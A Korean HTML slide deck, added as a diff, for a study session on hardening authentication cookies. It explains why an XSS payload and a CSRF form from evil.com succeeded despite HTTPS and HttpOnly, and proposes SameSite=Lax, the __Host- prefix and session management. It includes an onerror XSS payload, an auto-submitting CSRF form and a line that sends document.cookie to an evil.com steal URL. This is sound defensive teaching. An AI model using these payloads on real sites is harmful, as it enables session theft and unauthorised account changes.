@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Case No.2 — 인증 Cookie 설정 강화</title>
+<style>
+  :root {
+    --bg: #ffffff;
+    --bg-soft: #f4f6fa;
+    --fg: #16181d;
+    --fg-dim: #5b6270;
+    --accent: #2563eb;
+    --red: #dc2626;
+    --amber: #d97706;
+    --green: #16a34a;
+    --border: #e2e5ea;
+    --code-bg: #eef1f6;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-snap-type: y mandatory; scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, "Apple SD Gothic Neo", "Pretendard", sans-serif;
+    line-height: 1.5;
+  }
+  section.slide {
+    min-height: 100vh;
+    scroll-snap-align: start;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    padding: 80px 5vw 56px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+  }
+
+  /* 구획별 색상: 문제=red, 판단=amber, 해결=green */
+  section.problem  { --section: var(--red); }
+  section.judgment { --section: var(--amber); }
+  section.solution { --section: var(--green); }
+  section.problem, section.judgment, section.solution { border-left: 6px solid var(--section); }
+
+  .kicker {
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    font-size: 0.9rem;
+    color: var(--section, var(--accent));
+    font-weight: 700;
+    margin-bottom: 10px;
+  }
+  h1 { font-size: 3.2rem; margin: 0 0 20px; line-height: 1.25; }
+  h2 { font-size: 2.2rem; margin: 0 0 20px; line-height: 1.3; }
+  h3 { font-size: 1.25rem; color: var(--fg); margin: 0 0 10px; }
+  p { color: var(--fg-dim); font-size: 1.12rem; margin: 0 0 10px; }
+  ul { color: var(--fg-dim); font-size: 1.08rem; padding-left: 1.2em; margin: 8px 0; }
+  li { margin-bottom: 6px; }
+  b { color: var(--fg); }
+  code {
+    background: var(--code-bg);
+    color: var(--accent);
+    padding: 2px 7px;
+    border-radius: 5px;
+    font-size: 0.92em;
+    font-family: "SF Mono", Menlo, monospace;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    font-size: 0.95rem;
+    line-height: 1.55;
+    margin: 10px 0;
+  }
+  pre code { background: none; padding: 0; color: #1f2a3d; }
+  pre .hl { color: var(--red); font-weight: 700; }
+  pre .ok { color: var(--green); font-weight: 700; }
+
+  .slide-num {
+    position: absolute;
+    bottom: 18px;
+    right: 5vw;
+    font-size: 0.95rem;
+    color: var(--fg-dim);
+    font-variant-numeric: tabular-nums;
+  }
+
+  .title-slide { justify-content: center; align-items: flex-start; }
+  .title-slide h1 { font-size: 3.4rem; max-width: 1000px; }
+  .title-meta { color: var(--fg-dim); font-size: 1.2rem; margin-top: 6px; }
+
+  .divider { justify-content: center; }
+  .divider .num {
+    font-size: 5rem;
+    font-weight: 800;
+    color: var(--section);
+    line-height: 1;
+    margin-bottom: 16px;
+  }
+  .divider h1 { margin-bottom: 12px; }
+
+  .cols-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; align-items: start; }
+  .cols-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; align-items: start; }
+
+  .box {
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px 20px;
+  }
+  .box.top { border-top: 3px solid var(--section, var(--accent)); }
+  .box h3 { margin-bottom: 8px; }
+  .box p, .box li { font-size: 1rem; }
+
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    font-size: 1.02rem;
+    margin-top: 12px;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 9px 13px;
+    text-align: left;
+    vertical-align: top;
+  }
+  th { background: var(--bg-soft); color: var(--fg); font-size: 0.98rem; }
+  td.good { color: var(--green); font-weight: 700; }
+  td.bad { color: var(--red); font-weight: 700; }
+
+  .note, .warn, .conclusion {
+    margin-top: 14px;
+    padding: 12px 18px;
+    border-radius: 0 8px 8px 0;
+    font-size: 1.02rem;
+  }
+  .note { background: rgba(37, 99, 235, 0.07); border-left: 3px solid var(--accent); color: #1e3a5f; }
+  .warn { background: rgba(220, 38, 38, 0.07); border-left: 3px solid var(--red); color: #7f1d1d; }
+  .conclusion { background: rgba(22, 163, 74, 0.08); border-left: 3px solid var(--green); color: #14532d; }
+
+  .layers { display: flex; flex-direction: column; gap: 8px; margin-top: 8px; }
+  .layer {
+    display: grid;
+    grid-template-columns: 180px 1fr 1fr;
+    gap: 14px;
+    align-items: center;
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-size: 1.02rem;
+  }
+  .layer.me { border: 2px solid var(--green); background: rgba(22, 163, 74, 0.06); }
+  .layer .name { font-weight: 700; }
+  .layer .role { color: var(--fg-dim); }
+
+  .progress-bar {
+    position: fixed;
+    top: 0; left: 0; height: 3px;
+    background: var(--accent);
+    z-index: 999;
+    width: 0%;
+    transition: width 0.1s linear;
+  }
+
+  @media (max-width: 800px) {
+    h1, .title-slide h1 { font-size: 2.2rem; }
+    h2 { font-size: 1.6rem; }
+    .cols-2, .cols-3 { grid-template-columns: 1fr; }
+    .layer { grid-template-columns: 1fr; gap: 4px; }
+    section.slide { padding: 56px 16px 48px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="progress-bar" id="progress"></div>
+
+<!-- ============ 타이틀 ============ -->
+<section class="slide title-slide">
+  <div class="kicker">한계단 딥다이브 스터디 · Case No.2</div>
+  <h1>HTTPS + HttpOnly인데 왜 뚫렸나<br />— 인증 Cookie 설정 강화</h1>
+  <p class="title-meta">발표자: join0life</p>
+  <p class="title-meta" style="font-size:1rem;">
+    <span style="color:var(--red);font-weight:700;">① 문제</span> →
+    <span style="color:var(--amber);font-weight:700;">② 판단</span> →
+    <span style="color:var(--green);font-weight:700;">③ 해결</span>
+  </p>
+  <div class="slide-num"></div>
+</section>
+
+<!-- ============ ① 문제 ============ -->
+<section class="slide problem divider">
+  <div class="num">01</div>
+  <h1>문제</h1>
+  <p>무엇이, 어떤 조건에서 일어났나</p>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide problem">
+  <div class="kicker">문제 · 현재 구조</div>
+  <h2>팀은 "인증 보안은 충분하다"고 생각했다</h2>
+  <div class="cols-3">
+    <div class="box">
+      <h3>서비스 구조</h3>
+      <pre><code>Frontend
+https://app.example.com
+
+Backend API
+https://api.example.com</code></pre>
+    </div>
+    <div class="box">
+      <h3>세션 쿠키</h3>
+      <pre><code>Set-Cookie: sessionId=abc123;
+  HttpOnly;
+  Secure;
+  <span class="hl">SameSite=None;</span></code></pre>
+    </div>
+    <div class="box">
+      <h3>API 호출</h3>
+      <pre><code>fetch("https://api.example.com/api/me", {
+  credentials: "include",
+});</code></pre>
+    </div>
+  </div>
+  <table>
+    <thead><tr><th>적용된 것</th><th>적용되지 않은 것</th></tr></thead>
+    <tbody>
+      <tr>
+        <td class="good">HTTPS · HttpOnly · Secure · CORS(app만 허용)</td>
+        <td class="bad">입력 Sanitization · CSP · CSRF Token · Origin 검증 · 세션 관리</td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide problem">
+  <div class="kicker">문제 1 · XSS</div>
+  <h2>쿠키는 안 털렸는데, 사용자 권한으로 요청이 나갔다</h2>
+  <div class="cols-2">
+    <div>
+      <h3>게시글을 HTML 그대로 렌더링</h3>
+      <pre><code>&lt;div
+  <span class="hl">dangerouslySetInnerHTML</span>={{
+    __html: post.content,
+  }}
+/&gt;</code></pre>
+      <h3 style="margin-top:14px;">공격자가 올린 게시글</h3>
+      <pre><code>&lt;img src="invalid"
+  <span class="hl">onerror</span>="fetch('https://api.example.com/api/profile', {
+    method: 'DELETE',
+    credentials: 'include'
+  })" /&gt;</code></pre>
+    </div>
+    <div>
+      <h3>일어난 일</h3>
+      <ul>
+        <li>다른 사용자가 게시글을 열자 공격자의 JS가 실행됨</li>
+        <li><code>document.cookie</code>로는 <code>sessionId</code>를 <b>읽지 못함</b> (HttpOnly)</li>
+        <li>그런데 API 호출에는 브라우저가 세션 쿠키를 <b>자동으로 붙임</b></li>
+        <li>비밀번호 변경, 프로필 수정·삭제가 <b>정상 처리됨</b></li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide problem">
+  <div class="kicker">문제 2 · CSRF</div>
+  <h2>외부 사이트에서 보낸 요청이 로그인한 사용자의 요청으로 처리됐다</h2>
+  <div class="cols-2">
+    <div>
+      <h3>https://evil.com 에 숨겨진 폼</h3>
+      <pre><code>&lt;form action="https://api.example.com/api/email"
+      method="POST"&gt;
+  &lt;input type="hidden" name="email"
+         value="attacker@example.com" /&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+  document.forms[0].submit();
+&lt;/script&gt;</code></pre>
+    </div>
+    <div>
+      <h3>일어난 일</h3>
+      <ul>
+        <li>로그인한 사용자가 <code>evil.com</code>에 접속만 함 (클릭 없음)</li>
+        <li>공격자는 <code>sessionId</code>를 모르지만, <code>SameSite=None</code>이라 cross-site 요청에도 쿠키가 붙음</li>
+        <li>서버는 유효한 세션만 확인하고, CSRF Token도 Origin도 검증하지 않음</li>
+        <li>이메일이 공격자 주소로 <b>변경됨</b></li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide problem">
+  <div class="kicker">문제 3 · 팀의 오해</div>
+  <h2>각 보안 옵션이 무엇을 막는지 모르고 있었다</h2>
+  <table>
+    <thead><tr><th>팀이 믿고 있던 것</th></tr></thead>
+    <tbody>
+      <tr><td>"HTTPS를 쓰니까 XSS·CSRF도 어느 정도 막힌다"</td></tr>
+      <tr><td>"<code>HttpOnly</code>를 쓰면 XSS가 방어된다"</td></tr>
+      <tr><td>"<code>Secure</code>는 켜 두었지만, 무엇을 막는지는 설명 못 함"</td></tr>
+      <tr><td>"<code>SameSite=None</code>을 왜 쓰는지, <code>Lax</code>·<code>Strict</code>와 뭐가 다른지 모름"</td></tr>
+      <tr><td>"CORS에서 app만 허용했으니 외부 사이트는 API를 호출할 수 없다"</td></tr>
+    </tbody>
+  </table>
+  <div class="slide-num"></div>
+</section>
+
+<!-- ============ ② 판단 ============ -->
+<section class="slide judgment divider">
+  <div class="num">02</div>
+  <h1>판단</h1>
+  <p>왜 이런 일이 가능했나</p>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide judgment">
+  <div class="kicker">판단 1 · XSS의 원인</div>
+  <h2>React의 자동 Escape를 스스로 끈 것이 원인</h2>
+  <div class="cols-2">
+    <div class="box top">
+      <h3>React가 막아주는 경우</h3>
+      <pre><code>&lt;div&gt;{post.content}&lt;/div&gt;</code></pre>
+      <p><code>&lt;</code>, <code>&gt;</code>를 Escape해서 <b>문자열로</b> 출력 → <code>&lt;img onerror&gt;</code>도 글자로 보일 뿐</p>
+    </div>
+    <div class="box top">
+      <h3>React가 막아주지 않는 경우</h3>
+      <ul>
+        <li><code>dangerouslySetInnerHTML</code> ← <b>이번 케이스</b></li>
+        <li><code>&lt;a href={userInput}&gt;</code>에 <code>javascript:</code> URL</li>
+        <li><code>ref</code>로 <code>innerHTML</code> 직접 조작</li>
+      </ul>
+    </div>
+  </div>
+  <table>
+    <thead><tr><th></th><th>Escape</th><th>Sanitization</th></tr></thead>
+    <tbody>
+      <tr><td><b>동작</b></td><td>모든 HTML을 문자열로 바꿈</td><td>허용한 태그만 남기고 위험한 부분을 제거</td></tr>
+      <tr><td><b>HTML 서식</b></td><td>사라짐</td><td>유지됨 (<code>&lt;b&gt;</code>, <code>&lt;p&gt;</code>)</td></tr>
+      <tr><td><b>제거 대상</b></td><td>-</td><td><code>&lt;script&gt;</code>, <code>onerror</code> 등 이벤트 속성, <code>javascript:</code> URL</td></tr>
+    </tbody>
+  </table>
+  <div class="note">HTML을 보여줘야 한다면 Escape는 못 쓰므로 <b>Sanitization(DOMPurify 등)이 빠져 있던 것</b>이 문제</div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide judgment">
+  <div class="kicker">판단 2 · HttpOnly의 한계</div>
+  <h2>HttpOnly는 쿠키를 "읽는 것"만 막는다</h2>
+  <div class="cols-2">
+    <div class="box">
+      <h3 style="color:var(--green);">막는 것</h3>
+      <pre><code>// XSS 코드가 세션 ID를 훔쳐 공격자 서버로 전송
+new Image().src =
+  "https://evil.com/steal?c=" + document.cookie;
+// → sessionId가 보이지 않음</code></pre>
+      <p>세션 ID <b>탈취</b> 방지</p>
+    </div>
+    <div class="box">
+      <h3 style="color:var(--red);">막지 못하는 것</h3>
+      <pre><code>// XSS 코드가 쿠키 값 없이 그냥 요청
+fetch("https://api.example.com/api/profile", {
+  method: "DELETE",
+  credentials: "include",
+});
+// → 브라우저가 쿠키를 알아서 붙임</code></pre>
+      <p>사용자 권한으로 요청 <b>실행</b></p>
+    </div>
+  </div>
+  <div class="note">
+    쿠키가 요청에 자동으로 붙는 건 HttpOnly의 특성이 아니라 <b>쿠키 자체의 특성</b>.
+    XSS 코드는 <code>app.example.com</code> 안에서 실행되므로 정상 프론트 코드와 똑같이 쿠키가 붙고 CORS도 통과한다.
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide judgment">
+  <div class="kicker">판단 3 · Origin vs Site</div>
+  <h2>app과 api는 Origin은 다르지만, Site는 같다</h2>
+  <div class="cols-2">
+    <div>
+      <pre><code>https://app.example.com:443/api/me
+└─┬─┘   └──────┬──────┘ └┬┘└──┬──┘
+scheme        host      port 경로</code></pre>
+      <pre><code>app . example . com
+ │       │       └─ eTLD
+ │       └───────── +1  → example.com
+ └───────────────── 서브도메인 (Site 비교에서 무시)</code></pre>
+    </div>
+    <div>
+      <table style="margin-top:10px;">
+        <thead><tr><th>구분</th><th>기준</th><th>app vs api</th></tr></thead>
+        <tbody>
+          <tr><td><b>Origin</b></td><td>scheme + host + port</td><td class="bad">다름 → CORS 대상</td></tr>
+          <tr><td><b>Site</b></td><td>scheme + eTLD+1</td><td class="good">같음 (same-site)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <div class="warn">
+    <code>SameSite</code>는 <b>Site 기준</b>으로 동작한다. <code>app → api</code>는 same-site라 <code>Lax</code>로 바꿔도 쿠키가 정상 전송된다.
+    즉 <b>이 구조에서 <code>SameSite=None</code>을 쓸 이유가 없었다.</b>
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide judgment">
+  <div class="kicker">판단 4 · SameSite</div>
+  <h2>SameSite는 "요청에 쿠키를 붙일지"를 정한다</h2>
+  <table>
+    <thead><tr><th>값</th><th>쿠키를 붙이는 요청</th><th>evil.com의 form POST</th></tr></thead>
+    <tbody>
+      <tr><td><code>Strict</code></td><td>same-site 요청만. 외부 링크를 타고 들어올 때도 안 붙음</td><td class="good">쿠키 안 붙음</td></tr>
+      <tr><td><code>Lax</code></td><td>same-site 요청 + 외부에서 링크 클릭 같은 top-level GET 이동<br /><span style="font-size:0.9rem;color:var(--fg-dim);">(생략 시 최신 브라우저 기본값)</span></td><td class="good">쿠키 안 붙음</td></tr>
+      <tr><td><code>None</code></td><td>cross-site 포함 모든 요청 (Secure 필수)</td><td class="bad">쿠키 붙음 ← 현재</td></tr>
+    </tbody>
+  </table>
+  <div class="note">
+    <code>SameSite</code>는 요청 자체를 막지 않는다. 요청은 서버까지 가지만, 쿠키가 없으니 <b>로그인한 사용자의 요청으로 인정되지 않는다.</b>
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide judgment">
+  <div class="kicker">판단 5 · CORS의 오해</div>
+  <h2>CORS Allowlist로는 CSRF를 막을 수 없다</h2>
+  <div class="cols-2">
+    <div class="box">
+      <h3>SOP · CORS가 제한하는 것</h3>
+      <ul>
+        <li>SOP: 다른 출처의 응답을 <b>읽는 것</b>을 제한</li>
+        <li>CORS: 서버가 허용한 출처만 응답을 <b>읽을 수 있게</b> 예외를 여는 정책</li>
+        <li>둘 다 요청을 <b>보내는 것</b> 자체는 막지 않음</li>
+      </ul>
+    </div>
+    <div class="box">
+      <h3>그래서 CSRF가 가능했다</h3>
+      <ul>
+        <li><code>&lt;form&gt;</code> POST는 CORS 검사 대상이 아님</li>
+        <li>요청은 서버에 도착해서 <b>처리됨</b></li>
+        <li>공격자는 응답을 못 읽지만, CSRF는 <b>보내기만 하면 성공</b></li>
+      </ul>
+    </div>
+  </div>
+  <table>
+    <thead><tr><th></th><th>공격 코드가 실행되는 곳</th><th>핵심</th></tr></thead>
+    <tbody>
+      <tr><td><b>XSS</b></td><td>우리 사이트 (<code>app.example.com</code>) 안</td><td>같은 Origin이라 SameSite·CORS·CSRF Token 모두 통과</td></tr>
+      <tr><td><b>CSRF</b></td><td>외부 사이트 (<code>evil.com</code>)</td><td>응답은 못 읽고, 쿠키 자동 첨부를 악용해 보내기만 함</td></tr>
+    </tbody>
+  </table>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide judgment">
+  <div class="kicker">판단 6 · 세션 ID</div>
+  <h2>이 케이스의 쿠키 값은 토큰이 아니라 세션 ID다</h2>
+  <div class="cols-2">
+    <div>
+      <pre><code>쿠키: sessionId=abc123   ← 랜덤 번호표
+
+서버 세션 저장소 (메모리, Redis 등)
+abc123 → { userId: 42, role: "user", ... }</code></pre>
+      <p>서버가 사용자 정보를 들고 있는 <b>stateful</b> 방식</p>
+    </div>
+    <table style="margin-top:10px;">
+      <thead><tr><th></th><th>세션 ID</th><th>토큰 (JWT)</th></tr></thead>
+      <tbody>
+        <tr><td><b>정보 위치</b></td><td>서버 저장소</td><td>토큰 안</td></tr>
+        <tr><td><b>검증</b></td><td>저장소 조회</td><td>서명 검증</td></tr>
+        <tr><td><b>강제 무효화</b></td><td class="good">쉬움 (저장소에서 삭제)</td><td class="bad">어려움</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="note">
+    세션 ID 방식이라 <b>재발급·만료·무효화를 서버에서 바로 제어할 수 있다</b> → 해결책의 세션 관리를 적용할 수 있는 근거
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<!-- ============ ③ 해결 ============ -->
+<section class="slide solution divider">
+  <div class="num">03</div>
+  <h1>해결</h1>
+  <p>인증 Cookie 설정 강화 (HttpOnly + Secure + Cookie 범위 / 세션 관리)</p>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide solution">
+  <div class="kicker">해결 · 이 방법의 위치</div>
+  <h2>공격을 막는 게 아니라, 세션을 지키고 피해를 줄이는 계층</h2>
+  <div class="layers">
+    <div class="layer"><span class="name">XSS 방어</span><span class="role">Escape · Sanitization · CSP</span><span class="role">공격이 <b>일어나지 않게</b></span></div>
+    <div class="layer"><span class="name">CSRF 방어</span><span class="role">SameSite · CSRF Token · Origin 검증</span><span class="role">공격이 <b>일어나지 않게</b></span></div>
+    <div class="layer me"><span class="name">인증 Cookie 강화</span><span class="role">HttpOnly · Secure · 범위 · 세션 관리</span><span class="role">세션이 <b>털리지 않게</b>, 털려도 <b>적게, 짧게</b></span></div>
+    <div class="layer"><span class="name">HTTPS / TLS · CORS</span><span class="role">HSTS · CORS Allowlist</span><span class="role">전송 구간 보호</span></div>
+  </div>
+  <table>
+    <thead><tr><th>항목</th><th>막는 것</th><th>현재</th></tr></thead>
+    <tbody>
+      <tr><td><b>HttpOnly</b></td><td>XSS 코드의 세션 ID 탈취</td><td class="good">적용됨</td></tr>
+      <tr><td><b>Secure</b></td><td>HTTP 평문 구간에서의 쿠키 노출</td><td class="good">적용됨</td></tr>
+      <tr><td><b>쿠키 범위</b></td><td>필요 없는 곳으로의 쿠키 전송, 서브도메인의 쿠키 덮어쓰기</td><td class="bad">SameSite=None, 제한 없음</td></tr>
+      <tr><td><b>세션 관리</b></td><td>세션 고정 공격, 탈취된 세션의 장기 사용</td><td class="bad">없음</td></tr>
+    </tbody>
+  </table>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide solution">
+  <div class="kicker">해결 · Before / After</div>
+  <h2>쿠키 한 줄이 이렇게 바뀐다</h2>
+  <pre style="font-size:1.05rem;"><code># Before
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; <span class="hl">SameSite=None</span>
+
+# After
+Set-Cookie: <span class="ok">__Host-</span>sessionId=&lt;랜덤값&gt;; <span class="ok">Path=/</span>; HttpOnly; Secure; <span class="ok">SameSite=Lax</span>; <span class="ok">Max-Age=1800</span></code></pre>
+  <table>
+    <thead><tr><th>변경</th><th>효과</th></tr></thead>
+    <tbody>
+      <tr><td><code>SameSite=None</code> → <code>Lax</code></td><td><code>evil.com</code>의 form POST에 쿠키가 붙지 않음 → 이번 CSRF 차단. <code>app → api</code>는 same-site라 영향 없음</td></tr>
+      <tr><td><code>__Host-</code> 접두사 (Domain 생략)</td><td>쿠키가 <code>api.example.com</code>에만 묶임. 다른 서브도메인이 같은 이름으로 덮어쓸 수 없음</td></tr>
+      <tr><td><code>Path=/</code></td><td><code>__Host-</code>의 필수 조건. 인증이 전체 API에 필요</td></tr>
+      <tr><td><code>Max-Age=1800</code></td><td>쿠키 수명을 30분으로 제한</td></tr>
+    </tbody>
+  </table>
+  <div class="note">
+    <b>Strict가 아니라 Lax인 이유</b> — Strict는 외부 사이트에서 링크를 타고 들어올 때도 쿠키를 보내지 않아, 로그인한 사용자도 첫 화면에서 로그아웃된 것처럼 보인다.
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide solution">
+  <div class="kicker">해결 · 세션 관리</div>
+  <h2>서버에서 세션의 수명을 관리한다</h2>
+  <div class="cols-2">
+    <div class="box top">
+      <h3>만료</h3>
+      <p>쿠키 <code>Max-Age</code> + 서버 세션의 <b>비활동 만료(idle)</b>와 <b>절대 만료(absolute)</b> → 세션이 악용될 수 있는 시간을 줄임</p>
+    </div>
+    <div class="box top">
+      <h3>로그인 시 세션 ID 재발급</h3>
+      <p>로그인 전 세션 ID를 버리고 예측 불가능한 새 ID 발급 → <b>세션 고정 공격</b> 방지</p>
+    </div>
+    <div class="box top">
+      <h3>로그아웃 시 서버 세션 삭제</h3>
+      <p>쿠키만 지우는 게 아니라 <b>서버 저장소에서도 삭제</b>해야 세션이 실제로 끊김</p>
+    </div>
+    <div class="box top" style="border:2px solid var(--green);">
+      <h3>민감한 작업은 재인증</h3>
+      <p>비밀번호·이메일 변경 시 <b>현재 비밀번호를 다시 입력</b>받음 → XSS 코드가 비밀번호 변경 요청을 보내도 처리되지 않음. <b>가장 효과가 큰 조치</b></p>
+    </div>
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<section class="slide solution">
+  <div class="kicker">해결 · 한계와 결론</div>
+  <h2>인증 Cookie 강화만으로는 끝나지 않는다</h2>
+  <table>
+    <thead><tr><th>남는 문제</th><th>함께 필요한 계층</th></tr></thead>
+    <tbody>
+      <tr><td>XSS 코드가 사용자 권한으로 요청하는 것 자체</td><td>XSS 방어 (Sanitization + CSP)</td></tr>
+      <tr><td>같은 Site의 다른 서브도메인에서 오는 요청 (<code>Lax</code>로 못 막음)</td><td>CSRF 방어 (CSRF Token + Origin 검증)</td></tr>
+      <tr><td>GET으로 상태를 바꾸는 API (<code>Lax</code>여도 top-level GET에는 쿠키가 붙음)</td><td>상태 변경은 POST/PUT/DELETE로만</td></tr>
+    </tbody>
+  </table>
+  <div class="conclusion" style="font-size:1.15rem;">
+    HttpOnly/Secure는 <b>쿠키 값을 훔쳐가는 것</b>만 막는다.
+    쿠키가 <b>어디로(범위), 언제까지(수명)</b> 쓰일 수 있는지까지 좁혀야 인증 Cookie가 강화된다.
+    다만 브라우저가 쿠키를 자동으로 붙이는 한, XSS 방어와 CSRF 방어가 함께 가야 한다.
+  </div>
+  <div class="slide-num"></div>
+</section>
+
+<!-- ============ Q&A ============ -->
+<section class="slide title-slide">
+  <div class="kicker">Thank you</div>
+  <h1>Q&amp;A</h1>
+  <div class="slide-num"></div>
+</section>
+
+<script>
+  const slides = Array.from(document.querySelectorAll('.slide'));
+  slides.forEach((s, i) => {
+    const n = s.querySelector('.slide-num');
+    if (n) n.textContent = `${i + 1} / ${slides.length}`;
+  });
+  window.addEventListener('scroll', () => {
+    const scrolled = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+    document.getElementById('progress').style.width = `${(scrolled / height) * 100}%`;
+  });
+  document.addEventListener('keydown', (e) => {
+    const current = slides.findIndex((s) => {
+      const r = s.getBoundingClientRect();
+      return r.top >= -10 && r.top < window.innerHeight / 2;
+    });
+    if (e.key === 'ArrowDown' || e.key === 'ArrowRight' || e.key === ' ') {
+      e.preventDefault();
+      slides[Math.min(current + 1, slides.length - 1)]?.scrollIntoView({ behavior: 'smooth' });
+    } else if (e.key === 'ArrowUp' || e.key === 'ArrowLeft') {
+      e.preventDefault();
+      slides[Math.max(current - 1, 0)]?.scrollIntoView({ behavior: 'smooth' });
+    }
+  });
+</script>
+
+</body>
+</html>
